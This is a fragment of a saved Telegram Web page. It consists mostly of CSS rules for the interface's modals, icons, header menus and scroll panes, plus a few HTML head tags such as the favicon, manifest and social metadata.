.img_round_image_wrap{position:relative;overflow:hidden;border-radius:50%;-webkit-transform:translateZ(0)}
.img_round_meta{background:rgba(0,0,0,.4);width:40px;height:40px;line-height:0;position:absolute;z-index:2;border-radius:50%;overflow:hidden;margin:-20px auto 0 -20px;top:50%;left:50%;pointer-events:none}
.img_round_video_unread .img_round_meta{background:rgba(100,144,177,.6)}
.icon-cancel{position:absolute;top:50%;left:50%;margin-left:-9px;margin-top:-1px}
.icon-cancel .icon-bar{display:block;width:18px;height:2px;background:#FFF;transform-origin:50% 50%}
.icon-cancel .icon-bar:first-child{-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}
.icon-cancel .icon-bar:last-child{-webkit-transform:translate3d(0,-2px,0) rotate(45deg);-moz-transform:translate3d(0,-2px,0) rotate(45deg);-o-transform:translate3d(0,-2px,0) rotate(45deg);-ms-transform:translate3d(0,-2px,0) rotate(45deg);transform:translate3d(0,-2px,0) rotate(45deg)}
.img_round_thumb{-webkit-filter:blur(2px);-moz-filter:blur(2px);-o-filter:blur(2px);-ms-filter:blur(2px);filter:blur(2px);filter:progid:DXImageTransform.Microsoft.Blur(PixelRadius='3');transform-origin:center center;-webkit-transform-origin:center center;-webkit-transform:scale(1.02,1.02);transform:scale(1.02,1.02);max-width:100%;height:auto}
.img_round_meta_contents{transition:all cubic-bezier(.25,.46,.45,.94) .2s}
.img_round_meta_contents.ng-enter,.img_round_meta_contents.ng-leave.ng-leave-active{opacity:0}
.img_round_meta_contents.ng-enter.ng-enter-active,.img_round_meta_contents.ng-leave{opacity:1}
.countries_modal_window .modal-dialog{max-width:392px}
.countries_modal_window .modal_simple_header{margin-bottom:12px;font-weight:400}
.countries_modal_search{padding:0 0 12px;margin:0 20px;position:relative}
.countries_modal_search_field{font-size:12px;line-height:normal;background-size:42px 1171px;border:1px solid #F2F2F2;border-radius:3px;padding:6px 20px 6px 30px;margin:0;background-color:#F2F2F2;background-image:/*savepage-url=../img/icons/IconsetW.png*/url();background-repeat:no-repeat;background-position:-6px -205px}
.is_2x .countries_modal_search_field{background-image:/*savepage-url=../img/icons/IconsetW_2x.png*/url();background-size:42px 1171px}
.countries_modal_search_field:active,.countries_modal_search_field:focus{background-color:#fff}
.countries_modal_search_field::-ms-clear{display:none}
a.countries_modal_search_clear{right:12px;margin-top:-34px}
.countries_modal_wrap .modal-body{padding:14px 0}
.countries_scrollable_wrap a.countries_modal_country{clear:both;overflow:hidden;color:#000;padding:8px 26px;font-size:12px;border-radius:0}
.countries_scrollable_wrap a.countries_modal_country:hover{border-radius:2px;background:#f2f6fa}
.countries_modal_country_code{color:#999}
.countries_scrollable_wrap a.countries_modal_country:hover .countries_modal_country_code{color:#698192}
.loading_dots{display:inline-block;font-size:1em;line-height:1;padding:.125em 0 .175em .15em}
.loading_dots i{border:.125rem solid;border-radius:50%;display:inline-block;height:.2rem;width:.2rem;margin-left:.2rem;-webkit-animation:loading_dots .8s linear infinite;-moz-animation:loading_dots .8s linear infinite;-ms-animation:loading_dots .8s linear infinite;animation:loading_dots .8s linear infinite}
.loading_dots i:nth-child(2){-webkit-animation-delay:.2s;-moz-animation-delay:.2s;-ms-animation-delay:.2s;animation-delay:.2s}
.loading_dots i:nth-child(3){-webkit-animation-delay:.4s;-moz-animation-delay:.4s;-ms-animation-delay:.4s;animation-delay:.4s}
@-webkit-keyframes loading_dots{0%{opacity:0}
50%{opacity:1}
100%{opacity:0}}
@-moz-keyframes loading_dots{0%{opacity:0}
50%{opacity:1}
100%{opacity:0}}
@-ms-keyframes loading_dots{0%{opacity:0}
50%{opacity:1}
100%{opacity:0}}
@keyframes loading_dots{0%{opacity:0}
50%{opacity:1}
100%{opacity:0}}
.telegram_modal_logo{background-image:/*savepage-url=../img/Telegram72.png*/url();background-repeat:no-repeat;background-position:0 0}
.is_2x .telegram_modal_logo{background-image:/*savepage-url=../img/Telegram72_2x.png*/url();background-size:72px 72px}
.changelog_modal_window .modal-dialog{max-width:480px}
.changelog_card_wrap{text-align:center;padding:12px 0 18px}
.changelog_header{margin-top:15px;font-size:16px}
.changelog_card{width:160px;height:160px;display:block;background:/*savepage-url=../img/changelog/card_wecandoit.png*/url() no-repeat;background-size:160px 160px;margin:0 auto}
.changelog_card_search{width:133px;height:133px;display:block;background:/*savepage-url=../img/changelog/search.png*/url() no-repeat;background-size:133px 133px;margin:0 auto}
.changelog_version_title{color:#9d9479;background:#efede3}
.changelog_version_changes_list li{line-height:20px}
.changelog_footer_wrap{padding:15px 28px 30px 120px}
.changelog_github_link{font-size:13px;float:right;color:#999}
.changelog_more_link{font-size:13px}
.bad_browser_wrap{border-radius:4px;border:1px solid #ccc;background:#fff;max-width:600px;margin:50px auto 0;padding:40px}
.bad_browser_wrap h2{margin-top:0}
.bad_browser_text{font-size:14px;line-height:160%;margin:25px 0 30px}
#nacl_listener{position:absolute;left:-10000px}
.peer_modal_profile_wrap{padding:35px 2px 0}
.peer_modal_photo{width:72px;height:72px;border-radius:36px;overflow:hidden}
a.peer_modal_photo,div.peer_modal_photo{display:block;margin-right:19px}
.peer_modal_photo .peer_initials{line-height:72px;font-size:22px}
.peer_modal_profile_name{font-size:14px;padding:15px 0 9px;font-weight:700}
.peer_modal_profile_description{color:#ccdeed}
.md_modal_split_action{display:block;background:#fff;float:right;position:relative;width:52px;height:52px;margin-left:20px;border-radius:26px;overflow:hidden;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.2);-moz-box-shadow:0 1px 1px rgba(0,0,0,.2);box-shadow:0 1px 1px rgba(0,0,0,.2)}
.md_modal_split_actions{position:absolute;right:25px;top:-26px}
.md_modal_split_actions_wrap{position:relative}
.md_modal_split_action_camera{display:inline-block;width:20px;height:18px;margin:17px 0 0 16px;background-image:/*savepage-url=../img/icons/ProfileIcons.png*/url();background-repeat:no-repeat;background-position:-10px -164px}
.is_2x .md_modal_split_action_camera{background-image:/*savepage-url=../img/icons/ProfileIcons_2x.png*/url();background-size:40px 420px}
.md_modal_split_action:active .md_modal_split_action_camera,.md_modal_split_action:hover .md_modal_split_action_camera{background-position:-10px -192px}
.md_modal_split_action_twitter{display:inline-block;width:27px;height:22px;margin:17px 0 0 13px;background-image:/*savepage-url=../img/icons/ProfileIcons.png*/url();background-repeat:no-repeat;background-position:-7px -280px}
.is_2x .md_modal_split_action_twitter{background-image:/*savepage-url=../img/icons/ProfileIcons_2x.png*/url();background-size:40px 420px}
.md_modal_split_action:active .md_modal_split_action_twitter,.md_modal_split_action:hover .md_modal_split_action_twitter{background-position:-7px -312px}
.md_modal_split_action_msg{display:inline-block;width:20px;height:20px;margin:18px 0 0 16px;background-image:/*savepage-url=../img/icons/ProfileIcons.png*/url();background-repeat:no-repeat;background-position:-10px -220px}
.is_2x .md_modal_split_action_msg{background-image:/*savepage-url=../img/icons/ProfileIcons_2x.png*/url();background-size:40px 420px}
.md_modal_split_action:active .md_modal_split_action_msg,.md_modal_split_action:hover .md_modal_split_action_msg{background-position:-10px -250px}
.md_modal_iconed_section_wrap{position:relative;border-bottom:1px solid #ebebeb;margin:19px 0 0 120px;padding-right:28px}
.md_modal_iconed_section_wrap:last-child{border-bottom:0}
.md_modal_iconed_section_number{margin-top:0}
.md_modal_iconed_section_toggle{margin-top:10px}
.md_modal_iconed_section_radio{margin-top:1px}
.md_modal_sections{padding-top:17px}
.md_modal_section_icon{display:inline-block;margin-left:-64px;margin-top:5px;position:absolute;background-image:/*savepage-url=../img/icons/ProfileIcons.png*/url();background-repeat:no-repeat;background-position:0 0}
.is_2x .md_modal_section_icon{background-image:/*savepage-url=../img/icons/ProfileIcons_2x.png*/url();background-size:40px 420px}
.md_modal_iconed_section_toggle .md_modal_section_icon{margin-top:8px}
.md_modal_iconed_section_radio .md_modal_section_icon{margin-top:10px}
.md_modal_iconed_section_link .md_modal_section_icon{margin-top:4px}
.md_modal_section_icon_phone{width:18px;height:18px;background-position:-12px -10px;margin-top:3px}
.md_modal_section_icon_about{width:20px;height:20px;background-position:-10px -344px;margin-top:0}
.md_modal_section_icon_notification{width:17px;height:20px;background-position:-12px -38px}
.md_modal_section_icon_keyboard{width:20px;height:14px;background-position:-10px -140px;margin-left:-66px}
.md_modal_section_icon_person{width:16px;height:16px;background-position:-12px -90px}
.md_modal_section_icon_people{width:22px;height:14px;background-position:-9px -116px}
.md_modal_section_icon_more{width:18px;height:12px;background-position:-11px -68px}
.md_modal_section_param_wrap{margin-top:19px;margin-bottom:19px}
.md_modal_section_param_wrap:last-child{margin-bottom:16px}
.md_modal_section_param_wrap .md_modal_section_param_name{color:#909090;font-size:11px;line-height:14px;margin-top:4px}
.md_modal_section_param_wrap .md_modal_section_param_value{word-break:break-word;word-wrap:break-word;overflow:hidden}
.md_modal_section_range_wrap{padding-right:4px;margin-bottom:25px;padding-top:1px}
.md_modal_section_select_wrap{margin-bottom:20px}
.md_modal_section_select{float:right;font-size:12px;padding:0}
.md_modal_section_select_wrap .md_modal_section_param_name{padding-top:1px}
.md_modal_section_select .dropdown-toggle{font-size:12px;padding:0;line-height:normal}
.md_modal_section_select .dropdown-menu{left:-15px}
.md_modal_section_link{color:inherit;display:block;padding:4px 0}
.md_modal_section_link_wrap{padding-bottom:15px}
.md_modal_section_link:hover{text-decoration:none}
.md_modal_section_link.pull-right{color:#3a6d99}
.md_modal_section_text{display:block;padding:4px 0;color:#777}
.md_modal_section_version{color:#777;display:inline-block;margin-left:-70px;position:absolute}
.md_modal_section_splitter{border-top:1px solid #dfdfdf;min-height:12px;background:#f5f5f5;-webkit-box-shadow:inset 0 1px 1px #ededed;-moz-box-shadow:inset 0 1px 1px #ededed;box-shadow:inset 0 1px 1px #ededed}
.md_modal_section_splitter_content{height:auto;color:#777;font-size:12px;padding:5px 20px 3px 55px}
.md_modal_versioned_section_wrap{position:relative;border-bottom:1px solid #ebebeb;margin:19px 0 0 120px;padding-right:28px}
.md_modal_versioned_section_wrap:last-child{border-bottom:0}
.md_modal_list_peer_wrap{padding-bottom:16px}
.md_modal_list_peer_action{font-size:13px;padding:3px;margin:-3px}
.md_modal_list_peer_photo{width:42px;height:42px;line-height:42px;border-radius:50%;overflow:hidden}
a.md_modal_list_peer_photo,div.md_modal_list_peer_photo{margin-right:12px}
.md_modal_list_peer_name{font-size:13px;font-weight:700}
a.md_modal_list_peer_name{color:inherit}
.md_modal_list_peer_description{margin-top:4px;color:#999}
.md_modal_list_peer_description .status_online,.md_modal_list_peer_description.status_online{color:#3a6d99}
.md_modal_footer{padding:15px 27px}
.md_modal_footer_empty{padding:10px 27px 0}
.md_photo_loading{display:block;width:72px;height:72px;border-radius:36px;overflow:hidden;background:#48769b;text-align:center;line-height:72px;padding:0}
.md_photo_loading i{display:inline-block;background:#fff;width:8px;height:8px;border-radius:4px;vertical-align:middle;border:0;margin-left:6px}
.md_photo_loading i:first-child{margin-left:0}
.inactive_page_content{max-width:400px;margin:0 auto;text-align:center}
.inactive_image{display:block;background-image:/*savepage-url=../img/Manytabs.png*/url();background-repeat:no-repeat;width:341px;height:262px;margin:0 auto}
.is_2x .inactive_image{background-image:/*savepage-url=../img/Manytabs_2x.png*/url();background-size:341px 262px}
.inactive_title{font-size:18px;color:#444}
.inactive_description{color:#666;font-size:15px;line-height:150%}
.inactive_actions{margin-top:15px}
@media print{body,html{background:#fff}
body .im_page_wrap{border:0;box-shadow:none;overflow:visible}
body .im_bottom_panel_wrap,body .im_dialogs_col_wrap,body .tg_head_logo_wrap,body .tg_head_peer_dropdown,body .tg_head_peer_return_btn,body .tg_head_peer_search_btn{display:none}
body .im_history_wrap{height:auto!important}
body .nano-pane{display:none}
body .nano>.nano-content{position:static}
body .tg_head_peer_info{text-align:center}
body .im_history_col_wrap,body .tg_head_main_wrap{width:auto;max-width:700px;float:none;margin:0 auto}}
.visually-hidden{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px)}</style><link rel="manifest" href="manifest.webapp.json"><link rel="shortcut icon" type="image/x-icon" data-savepage-href="favicon.ico" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAAK/INwWK6QAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAAl2cEFnAAAAIAAAACAAh/qcnQAAAwxJREFUWMO9l19IU1Ecxz+7XmVukjJmKSWpKIQUBPlSCEZmSCWG7/XSk0+FUARBD0KWREL00FMURfjgU6RDNBJDimBCIUiI5lw6w9Fqzjbd3NbDva7turt7rn/6wuXec8/v/P7/zvkdy9FXHkygWX1OAMVADRAH5oAAMAEMAWOiDC0CCjiAO8Bl9VsEfuAl0AUEcxFKOeYKgFvAN+CaCeEApUAnMK++88wq4ACGgXsort4uioGHwICeAdkUqAPcQOMOBGvRAnwCqowUKAVeZyPcBdSgeDXDo+kKFAD9KuFeoUaVkcqJdAU62V2366EZJakzFHCgZPz/wm3UUEjaHzuF05rHlSP7eNp0gPr9Vj0yB3ADQAYKgas7EWqTLZw+ZKO1yk5DeWHq/9vvYdzLa3rLOoAuGTizXesbygs5X2mnqcKGTbZkzMUSSVyeP7mWO4BmGaVGhVFbkk9rVRGtVXacVt0NjnHfGsFowtAGGThmROW05tFWXcSFSju1JflCig54VkXIjsvobDqSBVoO27lUXcTJMqsIsxSC0QRjixER0hoZnfifrbDRc8ppSvAmRrxh1uNJEdJi3dNwdCFC33SIhBCfTAzmTr4MSOic17FEkm53gHaXj/ElIXcCsLi6kav0tAhKKN2MLmaDMTpGl+kYXWY2GDO2fl7cemBGAiZFKMeXIrS7fHS7A8RyxOXNnCkFPksoPZwQEknomw7x4utK1vnJn+t4Voy9lG6XBLzDoG/T4tnUStZNxmUi+VCa2BEJiADPzawMRhM8/vJ7i3cGPWEzbJ4A0c0yNOxeteifCeENbaTG40sRfq3HzVjfC/+O4wBw34wCiST0TARSY5PJd1eVmdER9WLiQgHw3hdh2BvGG9pgdEHY/SPAo82B9mJSCnxg7/rCGaCetHBrt2I/0IbB5rQD4efQ5Fq2s2BK1dJUOAwwpPLcYpjeYRQAmoCbmKyOLHyuAxf1+OS6G8aBB0A1SoL6TQj+gVJV1SgJp1ufIrfjdDSitHB1wEGgTGXuB7wo4RsEPooy/At+fulqEOTKiwAAACJ6VFh0U29mdHdhcmUAAHjac0zJT0pV8MxNTE8NSk1MqQQAL5wF1K4MqU0AAAAASUVORK5CYII="><link rel="apple-touch-icon" href="img/iphone_home120.png"><link rel="apple-touch-icon" sizes="120x120" href="img/iphone_home120.png"><link rel="apple-touch-startup-image" media="(device-width: 320px)" href="img/iphone_startup.png"><meta name="apple-mobile-web-app-title" content="Telegram Web"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="theme-color" content="#497495"><meta name="google" content="notranslate"><meta property="og:title" content="Telegram Web"><meta property="og:url" content="https://web.telegram.org/"><meta property="og:image" content="https://web.telegram.org/img/logo_share.png"><meta property="og:site_name" content="Telegram Web"><meta property="description" content="Welcome to the Web application of Telegram messenger. See https://github.com/zhukov/webogram for more info."><meta property="og:description" content="Welcome to the Web application of Telegram messenger. See https://github.com/zhukov/webogram for more info."><style data-savepage-href="css/desktop.css">/* Thanks to @brandonb927
   https://gist.github.com/brandonb927/3874012

   Prepending 'only screen and ' to each media query breaks nested media queries */
/* app desktop css */
.tg_head_split {
  max-width: 1010px;
  margin: 0 auto;
  height: 48px;
  background: #5682a3;
}
.tg_head_logo_wrap {
  float: left;
  width: 31%;
}
.tg_head_main_wrap {
  float: left;
  width: 69%;
  white-space: nowrap;
}
.tg_head_btn {
  display: block;
  font-weight: bold;
  padding: 16px 19px;
  color: #b9cfe3;
  font-size: 13px;
  line-height: 16px;
}
.dropdown.open .tg_head_btn,
.tg_head_btn:hover {
  color: #fff;
  text-decoration: none;
  background: #497799;
}
.dropdown.open .tg_head_btn {
  position: relative;
  z-index: 5;
}
.tg_head_logo_dropdown .dropdown-toggle {
  color: #fff;
  padding: 17px 20px 15px 22px;
  display: block;
  font-size: 14px;
  line-height: 16px;
  vertical-align: top;
}
.tg_head_logo_dropdown .dropdown-toggle:hover,
.tg_head_logo_dropdown .dropdown-toggle:focus,
.tg_head_logo_dropdown .dropdown-toggle:active {
  text-decoration: none;
}
.tg_head_logo_dropdown .dropdown-toggle .tg_head_logo_text {
  display: inline-block;
  vertical-align: top;
}
.icon-hamburger-wrap {
  display: inline-block;
  width: 18px;
  height: 14px;
  -webkit-transform: translate3d(0, 0, 0);
}
.tg_head_logo_dropdown .icon-hamburger-wrap {
  margin: 0 40px 0 0;
  vertical-align: top;
}
.tg_head_logo_dropdown .icon-tg-title {
  vertical-align: top;
}
.icon-hamburger-wrap .icon-bar {
  background: #fff;
  display: block;
  height: 2px;
  margin: 0;
}
.icon-hamburger-wrap .icon-bar:nth-child(2) {
  margin-bottom: 4px;
  margin-top: 4px;
}
.tg_head_logo_dropdown .icon-bar {
  opacity: 1;
  -webkit-transition: -webkit-transform 0.1s ease-in;
  -o-transition: -o-transform 0.1s ease;
  -ms-transition: -ms-transform 0.1s ease;
  -moz-transition: -moz-transform 0.1s ease;
  transition: transform 0.1s ease-in;
  -webkit-transform-origin: 50% 50%;
  -o-transform-origin: 50% 50%;
  -ms-transform-origin: 50% 50%;
  -moz-transform-origin: 50% 50%;
  transform-origin: 50% 50%;
}
.tg_head_logo_dropdown:not(.open) .dropdown-toggle:hover .icon-bar:nth-child(1) {
  -webkit-transform: translateY(-1px);
  -moz-transform: translateY(-1px);
  -o-transform: translateY(-1px);
  -ms-transform: translateY(-1px);
  transform: translateY(-1px);
}
.tg_head_logo_dropdown:not(.open) .dropdown-toggle:hover .icon-bar:nth-child(3) {
  -webkit-transform: translateY(1px);
  -moz-transform: translateY(1px);
  -o-transform: translateY(1px);
  -ms-transform: translateY(1px);
  transform: translateY(1px);
}
.tg_head_logo_dropdown.open .icon-bar:nth-child(1) {
  -webkit-transform: translate3d(0, 6px, 0) rotate(45deg);
  -moz-transform: translate3d(0, 6px, 0) rotate(45deg);
  -o-transform: translate3d(0, 6px, 0) rotate(45deg);
  -ms-transform: translate3d(0, 6px, 0) rotate(45deg);
  transform: translate3d(0, 6px, 0) rotate(45deg);
}
.tg_head_logo_dropdown.open .icon-bar:nth-child(2) {
  opacity: 0;
}
.tg_head_logo_dropdown.open .icon-bar:nth-child(3) {
  -webkit-transform: translate3d(0, -6px, 0) rotate(-45deg);
  -moz-transform: translate3d(0, -6px, 0) rotate(-45deg);
  -o-transform: translate3d(0, -6px, 0) rotate(-45deg);
  -ms-transform: translate3d(0, -6px, 0) rotate(-45deg);
  transform: translate3d(0, -6px, 0) rotate(-45deg);
}
.tg_head_logo_dropdown .dropdown-menu {
  border-radius: 0;
  padding: 9px 0 7px;
  margin: -1px 0 0;
  float: none;
  right: 0;
  border: 1px solid rgba(15, 60, 96, 0.2);
  border-left-color: #b5c3d0;
  border-right-color: #b5c3d0;
  -webkit-box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
  -moz-box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
  box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
  overflow: hidden;
}
@-webkit-keyframes rollIn {
  from {
    transform: translateY(-220px);
  }
  to {
    transform: translateY(0);
  }
}
@keyframes rollIn {
  from {
    transform: translateY(-220px);
  }
  to {
    transform: translateY(0);
  }
}
.tg_head_logo_dropdown.open .dropdown-menu {
  -webkit-animation: rollIn 0.1s ease-in;
  animation: rollIn 0.1s ease-in;
  z-index: 4;
}
.tg_head_logo_dropdown .dropdown-menu > li > a {
  font-size: 12px;
  line-height: 21px;
  padding: 11px 19px 10px 21px;
  color: #42749b;
}
.tg_head_logo_dropdown .dropdown-menu > li > a:hover {
  background: #f2f6fa;
}
.tg_head_logo_dropdown .dropdown-menu > li > a span {
  vertical-align: top;
}
.icon-new-group {
  width: 20px;
  height: 14px;
  margin-right: 38px;
  display: inline-block;
  vertical-align: top;
  margin-top: 3px;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -10px -111px;
}
.is_2x .icon-new-group {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.icon-contacts {
  width: 18px;
  height: 18px;
  margin-right: 40px;
  margin-top: 2px;
  display: inline-block;
  vertical-align: top;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -11px -135px;
}
.is_2x .icon-contacts {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.icon-settings {
  width: 20px;
  height: 20px;
  margin-right: 38px;
  margin-top: 1px;
  display: inline-block;
  vertical-align: top;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -10px -163px;
}
.is_2x .icon-settings {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.icon-faq {
  width: 20px;
  height: 20px;
  margin-right: 38px;
  margin-top: 1px;
  display: inline-block;
  vertical-align: top;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -10px -637px;
}
.is_2x .icon-faq {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.icon-about {
  width: 21px;
  height: 21px;
  margin-right: 37px;
  display: inline-block;
  vertical-align: top;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: -10px -193px;
}
.is_2x .icon-about {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.tg_head_connecting_text {
  color: #b9cfe3;
  padding: 14px 15px;
  font-size: 13px;
  display: block;
  line-height: 20px;
  float: left;
}
.tg_head_connecting_wrap .tg_head_btn {
  float: left;
}
.tg_head_peer_search_btn {
  float: right;
  padding-top: 15px;
  padding-bottom: 15px;
}
.tg_head_peer_dropdown {
  float: right;
}
.tg_head_peer_status {
  font-weight: normal;
}
.tg_head_peer_dropdown .dropdown-menu {
  max-width: 100%;
  border-radius: 0;
  padding: 9px 0;
  float: none;
  right: 0;
  left: auto;
  margin: -1px 0 0 0;
  border: 1px solid rgba(15, 60, 96, 0.2);
  -webkit-box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
  -moz-box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
  box-shadow: 0px 1px 3px 0px rgba(60, 75, 87, 0.27);
}
.tg_head_peer_more_dropdown .dropdown-menu {
  left: auto;
  right: 0;
}
.tg_head_peer_dropdown .dropdown-menu > li > a {
  font-size: 13px;
  line-height: 15px;
  padding: 11px 18px 11px 18px;
  color: #52719a;
}
.tg_head_peer_dropdown .dropdown-menu > li > a:hover {
  background: #f3f6fa;
}
.tg_head_peer_return_btn {
  float: right;
}
.tg_head_peer_return_count {
  color: #fff;
  margin-left: 3px;
}
.tg_head_peer_title_wrap {
  overflow: hidden;
}
.tg_head_peer_title_wrap .tg_head_btn {
  padding: 15px 19px 15px;
  line-height: 18px;
}
.tg_head_peer_title_wrap .tg_head_btn .tg_head_peer_info {
  display: block;
  white-space: nowrap;
  overflow: hidden;
  -ms-text-overflow: ellipsis;
  text-overflow: ellipsis;
}
.tg_head_peer_title {
  display: inline-block;
  color: #fff;
  margin-right: 3px;
  -ms-text-overflow: ellipsis;
  text-overflow: ellipsis;
  max-width: 180px;
  overflow: hidden;
  vertical-align: top;
}
.tg_head_peer_media {
  padding: 14px 19px;
  color: #fff;
  font-size: 13px;
  line-height: 20px;
  float: left;
  font-weight: bold;
}
.icon-search {
  display: inline-block;
  width: 17px;
  height: 17px;
  background-image: /*savepage-url=../img/icons/IconsetW.png*/ url();
  background-repeat: no-repeat;
  background-position: -12px -1037px;
  vertical-align: middle;
  opacity: 0.9;
}
.is_2x .icon-search {
  background-image: /*savepage-url=../img/icons/IconsetW_2x.png*/ url();
  background-size: 42px 1171px;
}
.tg_head_peer_media_dropdown .dropdown-toggle {
  display: block;
}
.tg_head_peer_media_dropdown .dropdown-toggle .icon-bar {
  display: block;
  background-color: #d7e5f0;
  width: 4px;
  height: 4px;
  border-radius: 2px;
  margin-left: 3px;
  margin-right: 3px;
}
.tg_head_peer_media_dropdown .dropdown-toggle .icon-bar + .icon-bar {
  margin-top: 2px;
}
.icon-filter-photos,
.icon-filter-video,
.icon-filter-documents,
.icon-filter-audio {
  display: inline-block;
  margin-right: 12px;
  vertical-align: top;
  background-image: /*savepage-url=../img/icons/General.png*/ var(--savepage-url-3);
  background-repeat: no-repeat;
  background-position: 0 0;
}
.is_2x .icon-filter-photos,
.is_2x .icon-filter-video,
.is_2x .icon-filter-documents,
.is_2x .icon-filter-audio {
  background-image: /*savepage-url=../img/icons/General_2x.png*/ url();
  background-size: 40px 948px;
}
.icon-filter-photos {
  width: 18px;
  height: 18px;
  background-position: -11px -223px;
  margin-top: 1px;
}
.icon-filter-video {
  width: 16px;
  height: 18px;
  background-position: -12px -278px;
  margin-top: 1px;
}
.icon-filter-documents {
  width: 18px;
  height: 17px;
  background-position: -11px -251px;
  margin-top: 1px;
}
.icon-filter-audio {
  width: 14px;
  height: 19px;
  background-position: -13px -306px;
  margin-top: 0;
}
/** initial setup **/
.nano {
  position: relative;
  width: 100%;
  height: 100%;
  overflow: hidden;
}
.nano > .nano-content {
  position: absolute;
  overflow: scroll;
  overflow-x: hidden;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
}
.nano > .nano-content:focus {
  outline: thin dotted;
}
.nano > .nano-content::-webkit-scrollbar {
  display: none;
}
.has-scrollbar > .nano-content::-webkit-scrollbar {
  display: block;
}
.nano > .nano-pane {
  background: rgba(0, 0, 0, 0.25);
  position: absolute;
  width: 10px;
  right: 0;
  top: 0;
  bottom: 0;
  visibility: hidden\9;
  /* Target only IE7 and IE8 with this hack */
  opacity: 0.01;
  -webkit-transition: 0.2s;
  -moz-transition: 0.2s;
  -o-transition: 0.2s;
  transition: 0.2s;
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
}
.nano > .nano-pane > .nano-slider {
  background: #444;
  background: rgba(0, 0, 0, 0.5);
  position: relative;
  margin: 0 1px;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
}
.nano:hover > .nano-pane,
.nano-pane.active,
.nano-pane.flashed {
  visibility: visible\9;
  /* Target only IE7 and IE8 with this hack */
  opacity: 0.99;
}
.composer_emoji_tooltip,
.composer_dropdown_wrap {
  z-index: 1001;
}
.composer_emoji_tooltip .nano > .nano-pane,
.composer_dropdown_wrap .nano > .nano-pane {
  background: rgba(255, 255, 255, 0);
  right: -2px;
  top: 5px;
  bottom: 5px;
}
.composer_emoji_tooltip .nano > .nano-pane > .nano-slider,
.composer_dropdown_wrap .nano > .nano-pane > .nano-slider {
  background: #d1d1d1;
  background: rgba(0, 0, 0, 0.17);
  margin: 0 3px 0 4px;
}
@media (max-width: 940px) {
  .composer_emoji_tooltip {
    margin-left: -245px;
  }
  .composer_emoji_tooltip_tail {
    left: 90%;
  }
}
.composer_dropdown_wrap .nano > .nano-pane {
  top: 3px;
  bottom: 3px;
  right: -1px;
}
.countries_modal_col .nano > .nano-pane {
  background: rgba(3, 36, 64, 0.08);
  width: 3px;
  right: 6px;
  top: 0;
  -webkit-transition: 0.2s;
  -moz-transition: 0.2s;
  -o-transition: 0.2s;
  transition: 0.2s;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
}
.countries_modal_col .nano > .nano-pane > .nano-slider {
  background: rgba(3, 46, 79, 0.22);
  margin: 0;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
}
.im_page_wrap {
  background: #fff;
  max-width: 1010px;
  min-width: 300px;
  margin: 0 auto;
  -webkit-box-shadow: 0px 1px 0 #dfe5ec;
  -moz-box-shadow: 0px 1px 0 #dfe5ec;
  box-shadow: 0px 1px 0 #dfe5ec;
  border-radius: 0 0 3px 3px;
  border-left: 1px solid #dfe5ec;
  border-right: 1px solid #dfe5ec;
  border-bottom: 1px solid #d2dbe3;
  overflow: hidden;
}
.footer_wrap {
  font-size: 11px;
  text-align: center;
  color: #9cacb9;
  line-height: 40px;
}
.footer_empty {
  height: 23px;
}
.footer_brand {
  color: #9cacb9;
  font-weight: bold;
}
a.footer_lang_link {
  color: #9cacb9;
}
a.footer_lang_link.active {
  font-weight: bold;
}
a.footer_link {
  color: #9cacb9;
  padding: 0 3px;
}
.footer_brand:hover,
.footer_brand:active,
a.footer_lang_link.active:hover,
a.footer_lang_link.active:active,
a.footer_link.active:hover,
a.footer_link.active:active {
  color: #8499aa;
  text-decoration: none;
}
.footer_link_divider {
  padding: 0 5px;
}
.im_dialogs_col {
  margin-right: -7px;
}
.im_dialogs_col_wrap {
  float: left;
  width: 31%;
  border-right: 2px solid #E9EBED;
  padding-bottom: 10px;
}
.im_dialogs_scrollable_wrap {
  padding: 0 7px 0 0;
  /* Hardware acceleration in Safari */
  -webkit-transform: translateZ(0);
  -webkit-perspective: 1000;
  -webkit-backface-visibility: hidden;
}
.im_dialogs_col .nano > .nano-pane {
  background: rgba(0, 0, 0, 0);
  width: 12px;
  right: 0px;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  border-radius: 0;
  -webkit-transition: none;
  -moz-transition: none;
  -o-transition: none;
  transition: none;
}
